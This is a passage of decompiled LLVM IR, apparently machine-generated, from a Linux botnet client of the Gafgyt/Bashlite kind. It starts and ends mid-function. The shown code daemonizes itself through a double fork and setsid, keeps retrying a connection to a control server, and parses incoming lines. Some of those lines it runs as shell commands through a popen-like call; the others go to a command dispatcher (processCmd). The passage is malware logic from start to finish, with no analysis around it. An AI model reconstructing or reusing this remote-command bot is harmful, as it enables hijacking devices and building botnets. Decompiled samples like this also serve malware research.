  %v2_805edc9 = xor i32 %v1_805edc9, %v0_805edc4
  %v4_805edcb = inttoptr i32 %v2_805edc9 to i8*
  store i8* %v4_805edcb, i8** %stack_var_-36976, align 4
  %v2_805edce = call i32 @srand(i32 %v2_805edc9)
  store i8* null, i8** %stack_var_-36976, align 4
  %v3_805edda = call i32 @__GI_time(i32* null)
  store i32 %v3_805edda, i32* @ebx, align 4
  %v0_805ede1 = call i32 @__getpid()
  %v1_805ede6 = load i32, i32* @ebx, align 4
  %v2_805ede6 = xor i32 %v1_805ede6, %v0_805ede1
  %v4_805ede8 = inttoptr i32 %v2_805ede6 to i8*
  store i8* %v4_805ede8, i8** %stack_var_-36976, align 4
  %v2_805edeb = call i32 @init_rand(i32 %v2_805ede6)
  %v0_805edf0 = call i32 @getOurIP()
  %v0_805edf5 = load i8*, i8** %stack_var_-36976, align 4
  %v1_805edf5 = ptrtoint i8* %v0_805edf5 to i32
  %v2_805edf5 = call i32 @__libc_fork(i32 %v1_805edf5)
  %v4_805edfd = icmp eq i32 %v2_805edf5, 0
  br i1 %v4_805edfd, label %dec_label_pc_805ee2f, label %dec_label_pc_805ee29.thread

dec_label_pc_805ee29.thread:                      ; preds = %dec_label_pc_805ed0b
  %v2_805ee0b = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_805edf5, i32* @eax, align 4
  %v4_805ee15 = inttoptr i32 %v2_805edf5 to i8*
  store i8* %v4_805ee15, i8** %stack_var_-36976, align 4
  %v6_805ee18 = call i32 @__waitpid(i32 %v2_805edf5, i32 %v2_805ee0b, i32 0)
  store i8* null, i8** %stack_var_-36976, align 4
  %v2_805ee24 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805ee49

dec_label_pc_805ee2f:                             ; preds = %dec_label_pc_805ed0b
  %v0_805ee2f = load i8*, i8** %stack_var_-36976, align 4
  %v1_805ee2f = ptrtoint i8* %v0_805ee2f to i32
  %v2_805ee2f = call i32 @__libc_fork(i32 %v1_805ee2f)
  %v4_805ee37 = icmp eq i32 %v2_805ee2f, 0
  br i1 %v4_805ee37, label %dec_label_pc_805ee49, label %dec_label_pc_805ee3d

dec_label_pc_805ee3d:                             ; preds = %dec_label_pc_805ee2f
  store i8* null, i8** %stack_var_-36976, align 4
  %v2_805ee44 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805ee49

dec_label_pc_805ee49:                             ; preds = %dec_label_pc_805ee29.thread, %dec_label_pc_805ee2f, %dec_label_pc_805ee3d
  %v0_805ee49 = call i32 @__GI_setsid()
  store i8* bitcast (i32* @global_var_806e871.1549 to i8*), i8** %stack_var_-36976, align 4
  %v2_805ee55 = call i32 @chdir(i32 ptrtoint (i32* @global_var_806e871.1549 to i32))
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-36976, align 4
  %v4_805ee69 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_805f463 = ptrtoint i32* %stack_var_-4220 to i32
  %tmp84 = bitcast i32* %stack_var_-4220 to i8*
  %v1_805f185 = or i32 %v2_805f463, 1
  %v5_805f1bf = inttoptr i32 %v1_805f185 to i8*
  %tmp85 = bitcast i8** %stack_var_-28 to i32*
  %v2_805f2b5 = ptrtoint i32* %stack_var_-36896 to i32
  %tmp86 = bitcast i32* %stack_var_-36896 to i8*
  br label %dec_label_pc_805ee6e

dec_label_pc_805ee6e:                             ; preds = %dec_label_pc_805ee77, %dec_label_pc_805f463, %dec_label_pc_805ee49
  %v0_805ee6e = call i32 @initConnection()
  %v1_805ee73 = icmp eq i32 %v0_805ee6e, 0
  br i1 %v1_805ee73, label %dec_label_pc_805ee85, label %dec_label_pc_805ee77

dec_label_pc_805ee77:                             ; preds = %dec_label_pc_805ee6e
  store i8* inttoptr (i32 5 to i8*), i8** %stack_var_-36976, align 4
  %v2_805ee7e = call i32 @sleep(i32 5)
  br label %dec_label_pc_805ee6e

dec_label_pc_805ee85:                             ; preds = %dec_label_pc_805ee6e
  %v0_805ee85 = call i32 @getBuild()
  store i32 %v0_805ee85, i32* @ebx, align 4
  %v0_805ee8c = load i32, i32* @global_var_8078864.1307, align 4
  %v4_805ee91 = inttoptr i32 %v0_805ee8c to i8*
  store i8* %v4_805ee91, i8** %stack_var_-36976, align 4
  %v2_805ee94 = call i32 @__GI_inet_ntoa(i32 %v0_805ee8c)
  %v0_805ee99 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805ee99 = ptrtoint i8* %v0_805ee99 to i32
  store i8* %v0_805ee99, i8** %stack_var_-36976, align 4
  %v4_805eeba = call i32 @HackerPrint(i32 %v1_805ee99, i32 ptrtoint (i32* @global_var_806e87c.1551 to i32))
  br label %dec_label_pc_805f463

dec_label_pc_805eede:                             ; preds = %dec_label_pc_805f0d6, %dec_label_pc_805f08b
  %v2_805eee1 = mul i32 %storemerge14, 4
  %v0_805eee6 = load i32, i32* @global_var_8078874.36, align 4
  %v2_805eeeb = add i32 %v0_805eee6, %v2_805eee1
  %v1_805eeee = inttoptr i32 %v2_805eeeb to i32*
  %v2_805eeee = load i32, i32* %v1_805eeee, align 4
  store i32 %v2_805eeee, i32* @eax, align 4
  %v4_805ef00 = inttoptr i32 %v2_805eeee to i8*
  store i8* %v4_805ef00, i8** %stack_var_-36976, align 4
  %v6_805ef03 = call i32 @__waitpid(i32 %v2_805eeee, i32 0, i32 1)
  %tmp87 = icmp slt i32 %v6_805ef03, 1
  %.pre = add i32 %storemerge14, 1
  br i1 %tmp87, label %dec_label_pc_805f087, label %dec_label_pc_805ef10

dec_label_pc_805ef10:                             ; preds = %dec_label_pc_805eede
  br label %dec_label_pc_805ef44

dec_label_pc_805ef1b:                             ; preds = %dec_label_pc_805ef44, %dec_label_pc_805ef7e
  %v0_805ef1b = load i32, i32* @global_var_8078874.36, align 4
  %v2_805ef26 = mul i32 %storemerge16, 4
  %v1_805ef20 = add i32 %v2_805ef26, -4
  %v2_805ef29 = add i32 %v1_805ef20, %v0_805ef1b
  %v2_805ef39 = add i32 %v0_805ef1b, %v2_805ef26
  %v1_805ef3c = inttoptr i32 %v2_805ef39 to i32*
  %v2_805ef3c = load i32, i32* %v1_805ef3c, align 4
  %v2_805ef3e = inttoptr i32 %v2_805ef29 to i32*
  store i32 %v2_805ef3c, i32* %v2_805ef3e, align 4
  %v4_805ef40 = add i32 %storemerge16, 1
  br label %dec_label_pc_805ef44

dec_label_pc_805ef44:                             ; preds = %dec_label_pc_805ef10, %dec_label_pc_805ef1b
  %storemerge16 = phi i32 [ %v4_805ef40, %dec_label_pc_805ef1b ], [ %.pre, %dec_label_pc_805ef10 ]
  %v0_805ef5e = load i32, i32* @global_var_8071b4c.35, align 4
  %v10_805ef76 = icmp eq i32 %v0_805ef5e, 0
  br i1 %v10_805ef76, label %dec_label_pc_805ef7e, label %dec_label_pc_805ef1b

dec_label_pc_805ef7e:                             ; preds = %dec_label_pc_805ef44
  %v0_805ef58 = load i32, i32* @global_var_8071b48.34, align 8
  %v10_805ef92 = icmp ult i32 %storemerge16, %v0_805ef58
  br i1 %v10_805ef92, label %dec_label_pc_805ef1b, label %dec_label_pc_805ef9a

dec_label_pc_805ef9a:                             ; preds = %dec_label_pc_805ef7e
  %v0_805ef9a = load i32, i32* @global_var_8078874.36, align 4
  %v2_805efa5 = mul i32 %storemerge16, 4
  %v1_805ef9f = add i32 %v2_805efa5, -4
  %v2_805efa8 = add i32 %v1_805ef9f, %v0_805ef9a
  %v1_805efab = inttoptr i32 %v2_805efa8 to i32*
  store i32 0, i32* %v1_805efab, align 4
  %v0_805efb1 = load i32, i32* @global_var_8071b48.34, align 8
  %v0_805efb6 = load i32, i32* @global_var_8071b4c.35, align 4
  %v1_805efbc = add i32 %v0_805efb1, -1
  %v4_805efbc = icmp ne i32 %v0_805efb1, 0
  %v2_805efbf = zext i1 %v4_805efbc to i32
  %v3_805efbf = add i32 %v0_805efb6, -1
  %v4_805efbf = add i32 %v3_805efbf, %v2_805efbf
  store i32 %v1_805efbc, i32* @global_var_8071b48.34, align 8
  store i32 %v4_805efbf, i32* @global_var_8071b4c.35, align 4
  %v2_805efe2 = mul i32 %v0_805efb1, 4
  %v4_805efe5 = inttoptr i32 %v2_805efe2 to i8*
  store i8* %v4_805efe5, i8** %stack_var_-36976, align 4
  %v2_805efe8 = call i32 @malloc(i32 %v2_805efe2)
  br label %dec_label_pc_805f01c

dec_label_pc_805eff9:                             ; preds = %dec_label_pc_805f01c, %dec_label_pc_805f056
  %v2_805effc = mul i32 %storemerge15, 4
  %v5_805f001 = add i32 %v2_805effc, %v2_805efe8
  %v0_805f00c = load i32, i32* @global_var_8078874.36, align 4
  %v2_805f011 = add i32 %v0_805f00c, %v2_805effc
  %v1_805f014 = inttoptr i32 %v2_805f011 to i32*
  %v2_805f014 = load i32, i32* %v1_805f014, align 4
  %v2_805f016 = inttoptr i32 %v5_805f001 to i32*
  store i32 %v2_805f014, i32* %v2_805f016, align 4
  %v4_805f018 = add i32 %storemerge15, 1
  br label %dec_label_pc_805f01c

dec_label_pc_805f01c:                             ; preds = %dec_label_pc_805ef9a, %dec_label_pc_805eff9
  %storemerge15 = phi i32 [ %v4_805f018, %dec_label_pc_805eff9 ], [ 0, %dec_label_pc_805ef9a ]
  %v0_805f036 = load i32, i32* @global_var_8071b4c.35, align 4
  %v10_805f04e = icmp eq i32 %v0_805f036, 0
  br i1 %v10_805f04e, label %dec_label_pc_805f056, label %dec_label_pc_805eff9

dec_label_pc_805f056:                             ; preds = %dec_label_pc_805f01c
  %v0_805f030 = load i32, i32* @global_var_8071b48.34, align 8
  %v10_805f06a = icmp ult i32 %storemerge15, %v0_805f030
  br i1 %v10_805f06a, label %dec_label_pc_805eff9, label %dec_label_pc_805f072

dec_label_pc_805f072:                             ; preds = %dec_label_pc_805f056
  %v0_805f072 = load i32, i32* @global_var_8078874.36, align 4
  %v4_805f077 = inttoptr i32 %v0_805f072 to i8*
  store i8* %v4_805f077, i8** %stack_var_-36976, align 4
  %v2_805f07a = call i32 @free(i32 %v0_805f072)
  store i32 %v2_805efe8, i32* @global_var_8078874.36, align 4
  br label %dec_label_pc_805f087

dec_label_pc_805f087:                             ; preds = %dec_label_pc_805eede, %dec_label_pc_805f072
  br label %dec_label_pc_805f08b

dec_label_pc_805f08b:                             ; preds = %dec_label_pc_805f463, %dec_label_pc_805f087
  %storemerge14 = phi i32 [ %.pre, %dec_label_pc_805f087 ], [ 0, %dec_label_pc_805f463 ]
  %v2_805f096 = ashr i32 %storemerge14, 31
  %v0_805f09f = load i32, i32* @global_var_8071b48.34, align 8
  %v0_805f0a4 = load i32, i32* @global_var_8071b4c.35, align 4
  %v10_805f0bc = icmp ult i32 %v2_805f096, %v0_805f0a4
  br i1 %v10_805f0bc, label %dec_label_pc_805eede, label %dec_label_pc_805f0c8

dec_label_pc_805f0c8:                             ; preds = %dec_label_pc_805f08b
  store i32 %v0_805f0a4, i32* @ecx, align 4
  %v6_805f0d4 = icmp ugt i32 %v2_805f096, %v0_805f0a4
  br i1 %v6_805f0d4, label %dec_label_pc_805f0e8, label %dec_label_pc_805f0d6

dec_label_pc_805f0d6:                             ; preds = %dec_label_pc_805f0c8
  %v10_805f0dc = icmp ult i32 %storemerge14, %v0_805f09f
  br i1 %v10_805f0dc, label %dec_label_pc_805eede, label %dec_label_pc_805f0e8

dec_label_pc_805f0e8:                             ; preds = %dec_label_pc_805f0d6, %dec_label_pc_805f0c8
  %v0_805f0eb = load i32, i32* @ebp, align 4
  %v2_805f0eb = add i32 %v7_805f47e, -4212
  %v3_805f0eb = add i32 %v2_805f0eb, %v0_805f0eb
  %v4_805f0eb = inttoptr i32 %v3_805f0eb to i8*
  store i8 0, i8* %v4_805f0eb, align 1
  store i8* %tmp84, i8** %stack_var_-36976, align 4
  %v3_805f0fc = call i32 @trim(i8* %tmp84)
  store i32 %v2_805f463, i32* @eax, align 4
  store i8* %tmp84, i8** %stack_var_-36976, align 4
  %v5_805f112 = call i32 @strstr(i32 %v2_805f463, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80689d7.31, i32 0, i32 0))
  %v12_805f11f = icmp eq i32 %v5_805f112, %v2_805f463
  %v1_805f121 = icmp eq i1 %v12_805f11f, false
  br i1 %v1_805f121, label %dec_label_pc_805f13d, label %dec_label_pc_805f123

dec_label_pc_805f123:                             ; preds = %dec_label_pc_805f0e8
  %v0_805f123 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805f123 = ptrtoint i8* %v0_805f123 to i32
  store i8* %v0_805f123, i8** %stack_var_-36976, align 4
  %v4_805f133 = call i32 @HackerPrint(i32 %v1_805f123, i32 ptrtoint ([5 x i8]* @global_var_806e8af.1552 to i32))
  br label %dec_label_pc_805f463

dec_label_pc_805f13d:                             ; preds = %dec_label_pc_805f0e8
  store i32 %v2_805f463, i32* @eax, align 4
  store i8* %tmp84, i8** %stack_var_-36976, align 4
  %v5_805f14e = call i32 @strstr(i32 %v2_805f463, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806e8b4.1553, i32 0, i32 0))
  store i32 %v5_805f14e, i32* @edx, align 4
  %v12_805f15b = icmp eq i32 %v5_805f14e, %v2_805f463
  %v1_805f15d = icmp eq i1 %v12_805f15b, false
  br i1 %v1_805f15d, label %dec_label_pc_805f16b, label %dec_label_pc_805f15f

dec_label_pc_805f15f:                             ; preds = %dec_label_pc_805f13d
  store i8* null, i8** %stack_var_-36976, align 4
  %v2_805f166 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805f16b

dec_label_pc_805f16b:                             ; preds = %dec_label_pc_805f13d, %dec_label_pc_805f15f
  %v2_805f177 = load i8, i8* %tmp84, align 4
  %v10_805f17a = icmp eq i8 %v2_805f177, 33
  %v1_805f17c = icmp eq i1 %v10_805f17a, false
  br i1 %v1_805f17c, label %dec_label_pc_805f463, label %dec_label_pc_805f182

dec_label_pc_805f182:                             ; preds = %dec_label_pc_805f16b
  %v2_805f19491 = load i8, i8* %v5_805f1bf, align 1
  %v7_805f19797 = icmp eq i8 %v2_805f19491, 32
  br i1 %v7_805f19797, label %dec_label_pc_805f1a5, label %dec_label_pc_805f19b

dec_label_pc_805f18d:                             ; preds = %dec_label_pc_805f19b
  %v5_805f18d = add i32 %storemerge13.in99, 1
  %storemerge13 = inttoptr i32 %v5_805f18d to i8*
  %v2_805f194 = load i8, i8* %storemerge13, align 1
  %v7_805f197 = icmp eq i8 %v2_805f194, 32
  br i1 %v7_805f197, label %dec_label_pc_805f1a5, label %dec_label_pc_805f19b

dec_label_pc_805f19b:                             ; preds = %dec_label_pc_805f182, %dec_label_pc_805f18d
  %storemerge13100 = phi i8* [ %storemerge13, %dec_label_pc_805f18d ], [ %v5_805f1bf, %dec_label_pc_805f182 ]
  %storemerge13.in99 = phi i32 [ %v5_805f18d, %dec_label_pc_805f18d ], [ %v1_805f185, %dec_label_pc_805f182 ]
  %v2_805f19e = load i8, i8* %storemerge13100, align 1
  %v4_805f1a1 = icmp eq i8 %v2_805f19e, 0
  %v1_805f1a3 = icmp eq i1 %v4_805f1a1, false
  br i1 %v1_805f1a3, label %dec_label_pc_805f18d, label %dec_label_pc_805f1a5

dec_label_pc_805f1a5:                             ; preds = %dec_label_pc_805f18d, %dec_label_pc_805f19b, %dec_label_pc_805f182
  %storemerge13.lcssa = phi i8* [ %v5_805f1bf, %dec_label_pc_805f182 ], [ %storemerge13100, %dec_label_pc_805f19b ], [ %storemerge13, %dec_label_pc_805f18d ]
  %v2_805f1a8 = load i8, i8* %storemerge13.lcssa, align 1
  %v4_805f1ab = icmp eq i8 %v2_805f1a8, 0
  br i1 %v4_805f1ab, label %dec_label_pc_805f463, label %dec_label_pc_805f1b3

dec_label_pc_805f1b3:                             ; preds = %dec_label_pc_805f1a5
  store i8 0, i8* %storemerge13.lcssa, align 1
  store i8* %v5_805f1bf, i8** %stack_var_-36976, align 4
  %v3_805f1c8 = call i32 @strlen(i8* %v5_805f1bf)
  %v6_805f1cd = add i32 %v3_805f1c8, %v2_805f463
  %v1_805f1d0 = add i32 %v6_805f1cd, 2
  %v5_805f1d3 = inttoptr i32 %v1_805f1d0 to i8*
  %v1_805f1f2 = add i32 %v6_805f1cd, 1
  br label %dec_label_pc_805f1ef

dec_label_pc_805f1d8:                             ; preds = %dec_label_pc_805f20a, %dec_label_pc_805f1ef
  store i8* %v5_805f1d3, i8** %stack_var_-36976, align 4
  %v3_805f1e4 = call i32 @strlen(i8* %v5_805f1d3)
  %v2_805f1e9 = add i32 %v1_805f1f2, %v3_805f1e4
  %v1_805f1ec = inttoptr i32 %v2_805f1e9 to i8*
  store i8 0, i8* %v1_805f1ec, align 1
  br label %dec_label_pc_805f1ef

dec_label_pc_805f1ef:                             ; preds = %dec_label_pc_805f1b3, %dec_label_pc_805f1d8
  store i8* %v5_805f1d3, i8** %stack_var_-36976, align 4
  %v3_805f1fb = call i32 @strlen(i8* %v5_805f1d3)
  %v2_805f200 = add i32 %v1_805f1f2, %v3_805f1fb
  %v1_805f203 = inttoptr i32 %v2_805f200 to i8*
  %v2_805f203 = load i8, i8* %v1_805f203, align 1
  %v10_805f206 = icmp eq i8 %v2_805f203, 10
  br i1 %v10_805f206, label %dec_label_pc_805f1d8, label %dec_label_pc_805f20a

dec_label_pc_805f20a:                             ; preds = %dec_label_pc_805f1ef
  store i32 %v1_805f1f2, i32* @ebx, align 4
  store i8* %v5_805f1d3, i8** %stack_var_-36976, align 4
  %v3_805f216 = call i32 @strlen(i8* %v5_805f1d3)
  %v0_805f21b = load i32, i32* @ebx, align 4
  %v2_805f21b = add i32 %v0_805f21b, %v3_805f216
  %v1_805f21e = inttoptr i32 %v2_805f21b to i8*
  %v2_805f21e = load i8, i8* %v1_805f21e, align 1
  %v10_805f221 = icmp eq i8 %v2_805f21e, 13
  br i1 %v10_805f221, label %dec_label_pc_805f1d8, label %dec_label_pc_805f225

dec_label_pc_805f225:                             ; preds = %dec_label_pc_805f20a
  %v2_805f234105 = load i8, i8* %v5_805f1d3, align 1
  %v7_805f237111 = icmp eq i8 %v2_805f234105, 32
  br i1 %v7_805f237111, label %dec_label_pc_805f245, label %dec_label_pc_805f23b

dec_label_pc_805f22d:                             ; preds = %dec_label_pc_805f23b
  %v5_805f22d = add i32 %v4_805f231114, 1
  %v23_805f22d = inttoptr i32 %v5_805f22d to i8*
  %v2_805f234 = load i8, i8* %v23_805f22d, align 1
  %v7_805f237 = icmp eq i8 %v2_805f234, 32
  br i1 %v7_805f237, label %dec_label_pc_805f245, label %dec_label_pc_805f23b

dec_label_pc_805f23b:                             ; preds = %dec_label_pc_805f225, %dec_label_pc_805f22d
  %v4_805f231114 = phi i32 [ %v5_805f22d, %dec_label_pc_805f22d ], [ %v1_805f1d0, %dec_label_pc_805f225 ]
  %stack_var_-56.0113 = phi i8* [ %v23_805f22d, %dec_label_pc_805f22d ], [ %v5_805f1d3, %dec_label_pc_805f225 ]
  %v2_805f23e = load i8, i8* %stack_var_-56.0113, align 1
  %v4_805f241 = icmp eq i8 %v2_805f23e, 0
  %v1_805f243 = icmp eq i1 %v4_805f241, false
  br i1 %v1_805f243, label %dec_label_pc_805f22d, label %dec_label_pc_805f245

dec_label_pc_805f245:                             ; preds = %dec_label_pc_805f22d, %dec_label_pc_805f23b, %dec_label_pc_805f225
  %stack_var_-56.0.lcssa = phi i8* [ %v5_805f1d3, %dec_label_pc_805f225 ], [ %stack_var_-56.0113, %dec_label_pc_805f23b ], [ %v23_805f22d, %dec_label_pc_805f22d ]
  %v4_805f231.lcssa = phi i32 [ %v1_805f1d0, %dec_label_pc_805f225 ], [ %v4_805f231114, %dec_label_pc_805f23b ], [ %v5_805f22d, %dec_label_pc_805f22d ]
  store i8 0, i8* %stack_var_-56.0.lcssa, align 1
  %v5_805f24b = add i32 %v4_805f231.lcssa, 1
  %v2_805f276120 = load i8, i8* %v5_805f1d3, align 1
  %v4_805f279122 = icmp eq i8 %v2_805f276120, 0
  %v1_805f27b124 = icmp eq i1 %v4_805f279122, false
  br i1 %v1_805f27b124, label %dec_label_pc_805f257, label %dec_label_pc_805f27d

dec_label_pc_805f257:                             ; preds = %dec_label_pc_805f245, %dec_label_pc_805f257
  %storemerge12126 = phi i8* [ %storemerge12, %dec_label_pc_805f257 ], [ %v5_805f1d3, %dec_label_pc_805f245 ]
  %storemerge12.in125 = phi i32 [ %v5_805f26f, %dec_label_pc_805f257 ], [ %v1_805f1d0, %dec_label_pc_805f245 ]
  %v2_805f25a = load i8, i8* %storemerge12126, align 1
  %v3_805f25a = zext i8 %v2_805f25a to i32
  %v4_805f260 = inttoptr i32 %v3_805f25a to i8*
  store i8* %v4_805f260, i8** %stack_var_-36976, align 4
  %v2_805f263 = call i32 @__GI_toupper(i32 %v3_805f25a)
  %sext = mul i32 %v2_805f263, 16777216
  %v1_805f268 = sdiv i32 %sext, 16777216
  store i32 %v1_805f268, i32* @edx, align 4
  %v1_805f26d = trunc i32 %v1_805f268 to i8
  store i8 %v1_805f26d, i8* %storemerge12126, align 1
  %v5_805f26f = add i32 %storemerge12.in125, 1
  %storemerge12 = inttoptr i32 %v5_805f26f to i8*
  %v2_805f276 = load i8, i8* %storemerge12, align 1
  %v4_805f279 = icmp eq i8 %v2_805f276, 0
  %v1_805f27b = icmp eq i1 %v4_805f279, false
  br i1 %v1_805f27b, label %dec_label_pc_805f257, label %dec_label_pc_805f27d

dec_label_pc_805f27d:                             ; preds = %dec_label_pc_805f257, %dec_label_pc_805f245
  %v23_805f24b = inttoptr i32 %v5_805f24b to i8*
  store i32 %v1_805f1d0, i32* @eax, align 4
  store i8* %v5_805f1d3, i8** %stack_var_-36976, align 4
  %v5_805f28b = call i32 @__GI_strcoll(i8* %v5_805f1d3, i32 ptrtoint ([5 x i8]* @global_var_806e8b8.1554 to i32))
  %v1_805f290 = icmp eq i32 %v5_805f28b, 0
  %v1_805f292 = icmp eq i1 %v1_805f290, false
  br i1 %v1_805f292, label %dec_label_pc_805f36d, label %dec_label_pc_805f298

dec_label_pc_805f298:                             ; preds = %dec_label_pc_805f27d
  %v0_805f298 = call i32 @listFork()
  %v1_805f29d = icmp eq i32 %v0_805f298, 0
  %v1_805f29f = icmp eq i1 %v1_805f29d, false
  br i1 %v1_805f29f, label %dec_label_pc_805f463, label %dec_label_pc_805f2a5

dec_label_pc_805f2a5:                             ; preds = %dec_label_pc_805f298
  store i8* %tmp86, i8** %stack_var_-36976, align 4
  %v7_805f2be = call i32 @__GI_memset(i8* %tmp86, i32 0, i32 32676)
  store i8* %tmp86, i8** %stack_var_-36976, align 4
  %v6_805f2dc = call i32 @szprintf(i32 %v2_805f2b5, i32 ptrtoint ([8 x i8]* @global_var_806e8bd.1555 to i32), i32 %v5_805f24b)
  store i8* %tmp86, i8** %stack_var_-36976, align 4
  %v5_805f2f3 = call i32 @fdpopen(i32 %v2_805f2b5, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806e8c5.1556, i32 0, i32 0))
  %tmp88 = inttoptr i32 %v5_805f2f3 to i8*
  store i8* %tmp86, i8** %stack_var_-36976, align 4
  %v6_805f34d127 = call i32 @fdgets(i32 %v2_805f2b5, i32 32676, i32 %v5_805f2f3)
  %v1_805f352128 = icmp eq i32 %v6_805f34d127, 0
  %v1_805f354130 = icmp eq i1 %v1_805f352128, false
  br i1 %v1_805f354130, label %dec_label_pc_805f2fd, label %dec_label_pc_805f356

dec_label_pc_805f2fd:                             ; preds = %dec_label_pc_805f2a5, %dec_label_pc_805f2fd
  store i8* %tmp86, i8** %stack_var_-36976, align 4
  %v3_805f306 = call i32 @trim(i8* %tmp86)
  store i8* %tmp86, i8** %stack_var_-36976, align 4
  %v7_805f324 = call i32 @__GI_memset(i8* %tmp86, i32 0, i32 32676)
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-36976, align 4
  %v2_805f330 = call i32 @sleep(i32 1)
  store i8* %tmp86, i8** %stack_var_-36976, align 4
  %v6_805f34d = call i32 @fdgets(i32 %v2_805f2b5, i32 32676, i32 %v5_805f2f3)
  %v1_805f352 = icmp eq i32 %v6_805f34d, 0
  %v1_805f354 = icmp eq i1 %v1_805f352, false
  br i1 %v1_805f354, label %dec_label_pc_805f2fd, label %dec_label_pc_805f356

dec_label_pc_805f356:                             ; preds = %dec_label_pc_805f2fd, %dec_label_pc_805f2a5
  store i8* %tmp88, i8** %stack_var_-36976, align 4
  %v2_805f35c = call i32 @fdpclose(i32 %v5_805f2f3)
  store i8* null, i8** %stack_var_-36976, align 4
  %v2_805f368 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805f36d

dec_label_pc_805f36d:                             ; preds = %dec_label_pc_805f27d, %dec_label_pc_805f356
  store i8* %v23_805f24b, i8** %stack_var_-36976, align 4
  %v4_805f382 = call i32 @__GI_strtok(i32 %v5_805f24b, i32 ptrtoint (i32* @global_var_806e8c7.1557 to i32))
  %v5_805f387 = inttoptr i32 %v4_805f382 to i8*
  store i8* %v5_805f387, i8** %stack_var_-28, align 4
  store i32 %v1_805f1d0, i32* %stack_var_-124, align 4
  %v5_805f41620 = icmp eq i32 %v4_805f382, 0
  %v1_805f41a27 = icmp eq i1 %v5_805f41620, false
  br i1 %v1_805f41a27, label %dec_label_pc_805f395, label %dec_label_pc_805f420

dec_label_pc_805f395:                             ; preds = %dec_label_pc_805f36d, %dec_label_pc_805f3ff
  %v3_805f3a2 = phi i8* [ %tmp89, %dec_label_pc_805f3ff ], [ %v5_805f387, %dec_label_pc_805f36d ]
  %stack_var_-32.128 = phi i32 [ %stack_var_-32.0, %dec_label_pc_805f3ff ], [ 1, %dec_label_pc_805f36d ]
  %v2_805f398 = load i8, i8* %v3_805f3a2, align 1
  %v10_805f39b = icmp eq i8 %v2_805f398, 10
  br i1 %v10_805f39b, label %dec_label_pc_805f3ff, label %dec_label_pc_805f39f

dec_label_pc_805f39f:                             ; preds = %dec_label_pc_805f395
  store i32 %stack_var_-32.128, i32* @ebx, align 4
  store i8* %v3_805f3a2, i8** %stack_var_-36976, align 4
  %v3_805f3a8 = call i32 @strlen(i8* %v3_805f3a2)
  %v1_805f3ad = add i32 %v3_805f3a8, 1
  %v4_805f3b0 = inttoptr i32 %v1_805f3ad to i8*
  store i8* %v4_805f3b0, i8** %stack_var_-36976, align 4
  %v2_805f3b3 = call i32 @malloc(i32 %v1_805f3ad)
  %v1_805f3b8 = load i32, i32* @ebp, align 4
  %v2_805f3b8 = load i32, i32* @ebx, align 4
  %v3_805f3b8 = mul i32 %v2_805f3b8, 4
  %v4_805f3b8 = add i32 %v1_805f3b8, -116
  %v5_805f3b8 = add i32 %v4_805f3b8, %v3_805f3b8
  %v6_805f3b8 = inttoptr i32 %v5_805f3b8 to i32*
  store i32 %v2_805f3b3, i32* %v6_805f3b8, align 4
  %v3_805f3bc = load i8*, i8** %stack_var_-28, align 4
  %v4_805f3bc = ptrtoint i8* %v3_805f3bc to i32
  store i8* %v3_805f3bc, i8** %stack_var_-36976, align 4
  %v3_805f3c2 = call i32 @strlen(i8* %v3_805f3bc)
  %v1_805f3c7 = add i32 %v3_805f3c2, 1
  %v0_805f3cd = load i32, i32* @ebp, align 4
  %v2_805f3cd = mul i32 %stack_var_-32.128, 4
  %v3_805f3cd = add i32 %v2_805f3cd, -116
  %v4_805f3cd = add i32 %v0_805f3cd, %v3_805f3cd
  %v5_805f3cd = inttoptr i32 %v4_805f3cd to i32*
  %v6_805f3cd = load i32, i32* %v5_805f3cd, align 4
  %v4_805f3dd = inttoptr i32 %v6_805f3cd to i8*
  store i8* %v4_805f3dd, i8** %stack_var_-36976, align 4
  %v7_805f3e0 = call i32 @__GI_memset(i8* %v4_805f3dd, i32 0, i32 %v1_805f3c7)
  %v0_805f3eb = load i32, i32* @ebp, align 4
  %v4_805f3eb = add i32 %v0_805f3eb, %v3_805f3cd
  %v5_805f3eb = inttoptr i32 %v4_805f3eb to i32*
  %v6_805f3eb = load i32, i32* %v5_805f3eb, align 4
  store i32 %v6_805f3eb, i32* @eax, align 4
  %v4_805f3f3 = inttoptr i32 %v6_805f3eb to i8*
  store i8* %v4_805f3f3, i8** %stack_var_-36976, align 4
  %v5_805f3f6 = call i32 @strcpy(i8* %v4_805f3f3, i32 %v4_805f3bc)
  %v4_805f3fb = add i32 %stack_var_-32.128, 1
  br label %dec_label_pc_805f3ff

dec_label_pc_805f3ff:                             ; preds = %dec_label_pc_805f395, %dec_label_pc_805f39f
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.128, %dec_label_pc_805f395 ], [ %v4_805f3fb, %dec_label_pc_805f39f ]
  store i8* null, i8** %stack_var_-36976, align 4
  %v4_805f40e = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806e8c7.1557 to i32))
  store i32 %v4_805f40e, i32* %tmp85, align 4
  %v5_805f416 = icmp eq i32 %v4_805f40e, 0
  %v1_805f41a = icmp eq i1 %v5_805f416, false
  %tmp89 = inttoptr i32 %v4_805f40e to i8*
  br i1 %v1_805f41a, label %dec_label_pc_805f395, label %dec_label_pc_805f420

dec_label_pc_805f420:                             ; preds = %dec_label_pc_805f3ff, %dec_label_pc_805f36d
  %stack_var_-32.1.lcssa = phi i32 [ 1, %dec_label_pc_805f36d ], [ %stack_var_-32.0, %dec_label_pc_805f3ff ]
  %v4_805f42a = inttoptr i32 %stack_var_-32.1.lcssa to i8*
  store i8* %v4_805f42a, i8** %stack_var_-36976, align 4
  %v5_805f42d = call i32 @processCmd(i32 %stack_var_-32.1.lcssa, i32* nonnull %stack_var_-124)
  %v7_805f436 = icmp sgt i32 %stack_var_-32.1.lcssa, 1
  br i1 %v7_805f436, label %dec_label_pc_805f448.lr.ph, label %dec_label_pc_805f463

